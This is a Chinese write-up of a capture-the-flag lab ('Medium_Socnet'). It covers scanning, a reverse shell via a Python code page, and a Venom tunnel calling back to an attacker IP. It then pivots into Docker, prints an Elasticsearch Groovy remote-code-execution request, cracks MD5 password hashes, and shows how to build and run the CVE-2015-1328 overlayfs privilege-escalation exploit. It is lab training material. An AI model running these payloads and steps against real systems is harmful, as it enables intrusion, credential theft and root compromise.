# 云尘靶场 Medium_Socnet 内网为docker 无站代理 不存在gcc的提权方式 解决ldd过高无法执行exp 指定so文件

首先我们可以通过 arp-scan 扫描当前内网中的存活

但是不知道为什么扫不出来 然后我们使用fscan可以获取存活



<img src="https://i-blog.csdnimg.cn/blog_migrate/eeff28defd9d3ba79837e617baf44b83.png" alt="" style="max-height:224px; box-sizing:content-box;" />


这里大致扫描只开了22端口

所以我们使用nmap进行信息收集扫描

```css
nmap -sS -sV -A -p- 172.25.0.13
 
通过tcp 进行 版本服务扫描 并且检测系统版本 全端口
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/dfbb20d85ac650c235b2246a2ced04da.png" alt="" style="max-height:744px; box-sizing:content-box;" />


这里我们可以发现是通过python写的

或者我们如果只想测试端口 使用PortScan进行扫描



<img src="https://i-blog.csdnimg.cn/blog_migrate/4bebe1e1cc71ea06c36e2a94a027a36a.png" alt="" style="max-height:413px; box-sizing:content-box;" />


然后我们去访问 5000端口看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/0db95432476a080bf789f1d00f190afc.png" alt="" style="max-height:93px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/c808a705a23ea24a21b876ddcf4a6d93.png" alt="" style="max-height:454px; box-sizing:content-box;" />


这里提示我们输入代码执行 python 代码 所以我们看看能不能直接反弹shell  


<img src="https://i-blog.csdnimg.cn/blog_migrate/69974181d5d7d7122bee103b6f5c57a3.png" alt="" style="max-height:185px; box-sizing:content-box;" />


getshell咯

这里看题目

```undefined
这是一个中等难度的靶机，其内部还有几个docker虚拟机，从而可以对内网部分有初步的涉及，比如内网信息收集、内网穿透、简单的横向移动等等。
 
接入网络，自主探测发现仿真虚拟靶机，利用其上的漏洞，获得其root权限。提交john用户的密码作为答案。
```

可以想到有可能是docker虚拟机

 [快速判断是不是docker环境_怎么判断一个网站是不是docker-CSDN博客](https://blog.csdn.net/qq_34923966/article/details/113849954) 

## 查看是否为docker

```undefined
ps -ef
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4547bc8852ea8b2c24a093bfab0a6346.png" alt="" style="max-height:114px; box-sizing:content-box;" />


确实很少

```bash
ls /.dockerenv
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e236483dd23852c4c43a9b4c3f6540ef.png" alt="" style="max-height:73px; box-sizing:content-box;" />


确实有

```cobol
/proc/1/cgroup
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/183c77e191523536ea128b6146bb793b.png" alt="" style="max-height:260px; box-sizing:content-box;" />


全是docker 那么docker环境没跑了

这里在学习一下代理

## 内网代理

之前我使用的是Neo-reGeorg-5.1.0 但是这个需要为常见代码启的站 遇到无法在站中解析就不会了

这里学习一下

### venom

 [Release Venom v1.1.0 · Dliv3/Venom · GitHub](https://github.com/Dliv3/Venom/releases/tag/v1.1.0) 

首先我们开启服务 这里我是windows

```cobol
.\admin.exe -lport 9999
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/bfbf2ba4d28f53917aba2c40725082e9.png" alt="" style="max-height:233px; box-sizing:content-box;" />


然后开启服务 通过wget 下载到靶机中

```cobol
chmod 777 agent_linux_x64
./agent_linux_x64 -rhost 10.8.0.6 -rport 9999
```

然后回到主机

```cobol
show
 
goto 1
 
socks 1080
```

这样我们就在1080开启了socks5代理

然后我们去链接



<img src="https://i-blog.csdnimg.cn/blog_migrate/a520485c6df9a356127e5de2b8bae365.png" alt="" style="max-height:347px; box-sizing:content-box;" />


这里我们首先要知道 这个docker对应的内网ip是多少

ifconfig

```cobol
172.17.0.3
```

我们去访问172.17.0.3:5000



<img src="https://i-blog.csdnimg.cn/blog_migrate/c220f19a32055bf9165ca9ef0ac02e1e.png" alt="" style="max-height:533px; box-sizing:content-box;" />


发现是一样的

所以这里就是我们对应的内网ip了

我们要如何实现docker逃逸呢

首先我们需要探活

## 内网shell脚本探活

```bash
for i in $(seq 1 254);do ping -c 1 172.17.0.$i;done
```

这里我们无法通过socks代理出ping 因为位于不同层 所以要么通过反弹shell 获取ping

要么代理出来 nmap 但是我nmap扫除一大堆不是的 有可能是靶场的问题 所以我选择在反弹shell中 执行 shell脚本

```cobol
这里获取了
 
172.17.0.1，172.17.0.2，172.17.0.3
 
这些ip
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c2cdea731a173ebe5f0d674d4a024d34.png" alt="" style="max-height:327px; box-sizing:content-box;" />


然后我们就可以通过nmap进行服务的扫描了

```cobol
nmap -sV -sT 172.17.0.2 -Pn
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2b22d597c3b468a5e31fce983ce3e490.png" alt="" style="max-height:245px; box-sizing:content-box;" />


获取到 一个 9200端口 开启elasticsearch服务



<img src="https://i-blog.csdnimg.cn/blog_migrate/793bb24546b4c0bc9551371cf023129b.png" alt="" style="max-height:307px; box-sizing:content-box;" />


ok咯

去搜个exp



<img src="https://i-blog.csdnimg.cn/blog_migrate/848ad9a499a1400de34838be76fb1444.png" alt="" style="max-height:246px; box-sizing:content-box;" />


然后复制进去进行python

wget上传 执行 发现报错request没有安装

```cobol
pip install -t /usr/lib/python2.7/dist-packages/  requests
```

靶场问题无法联网安装

所以我们使用本地安装

 [https://www.cnblogs.com/Javi/p/9151629.html](https://www.cnblogs.com/Javi/p/9151629.html) 

 [https://www.cnblogs.com/rainbow-tan/p/14794387.html](https://www.cnblogs.com/rainbow-tan/p/14794387.html) 

这两个文章就可以实现下载了

然后执行

```cobol
python 36337.py  172.17.0.2
```

## getshell

这里我无法实现 所以我选择手动复现

先创建一个数据来保证存在数据

```cobol
POST /website/blog/ HTTP/1.1
Host: 172.17.0.2:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
 
 
{
  "name": "test"
}
```

其次就是执行命令

```cobol
POST /_search?pretty HTTP/1.1
Host: 172.17.0.2:9200
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 156
 
{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"ls\").getText()"}}}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/89ea2b50a5c3fbf87af278eb7f304df0.png" alt="" style="max-height:103px; box-sizing:content-box;" />


发现存在passwords 看看是啥

整理出来

```cobol
john:3f8184a7343664553fcb5337a3138814 ---->1337hack
test:861f194e9d6118f3d942a72be3e51749 ---->1234test
admin:670c3bbc209a18dde5446e5e6c1f1d5b---->1111pass 
root:b3d34352fc26117979deabdf1b9b6354 ---->1234pass    
jane:5c158b60ed97c723b673529b8a3cf72b ---->1234jane
```

md5爆破网站看看

依次通过ssh链接看看

最后通过john 的账号密码成功登入

<img src="https://i-blog.csdnimg.cn/blog_migrate/369d5e064f00248128be21377e0d8013.png" alt="" style="max-height:510px; box-sizing:content-box;" />


## 提权

现在我们需要提权

首先看看内核

```bash
uname -a
```

```cobol
Linux socnet 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

查找看看

```cobol
searchsploit 3.13.0 linux
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/84d799186cbba6730a39d7c6c14f7a9e.png" alt="" style="max-height:161px; box-sizing:content-box;" />


提取出来

这里有个问题 因为机器不一样 所以so文件也不会相同

所以我们无法保证 靶机上也存在相同的os文件 并且靶机也不存在gcc

所以我们需要把exp和so一同传递上去

先修改源代码

删除这里（这里注释）



<img src="https://i-blog.csdnimg.cn/blog_migrate/c795423b4fad2e02e51a4987afa91456.png" alt="" style="max-height:361px; box-sizing:content-box;" />


然后gcc打包

```r
gcc -o exp 37292.c 
```

然后我们去定位so文件

```cobol
find / -name ofs-lib.so 2>/dev/null
 
或者
 
locate ofs-lib.so
 
 cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so /mnt/c/Users/Administrator/Desktop/
```

然后我们直接上传到tmp

赋权执行



<img src="https://i-blog.csdnimg.cn/blog_migrate/b5a619984e710b69a7d51a54303034bd.png" alt="" style="max-height:47px; box-sizing:content-box;" />


这里报错了 这里说明我的 kali中动态链接库太高了 这里我们可以使用

ldd --version

确定靶机ldd 然后去下载 解压 并且在编译的时候选择

```cobol
gcc -o exp 37292.c -Ldir  /mnt/c/Users/Administrator/Desktop/ldd-2.19/libc6_2.19-0ubuntu6_amd64/data/lib/x86_64-linux-gnu/libc.so.6
```

然后传赋权即可

```perl
chmod +x exp
 
./exp
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/51ebb566c555504ac607e45a5caa6cbe.png" alt="" style="max-height:62px; box-sizing:content-box;" />


成功咯



<img src="https://i-blog.csdnimg.cn/blog_migrate/dca4c35be52d3736b6a766c9f58e0d4f.png" alt="" style="max-height:105px; box-sizing:content-box;" />


所以flag就是 1337hack

我觉得最主要的是解决了 靶机上无法执行命令获取exp的方法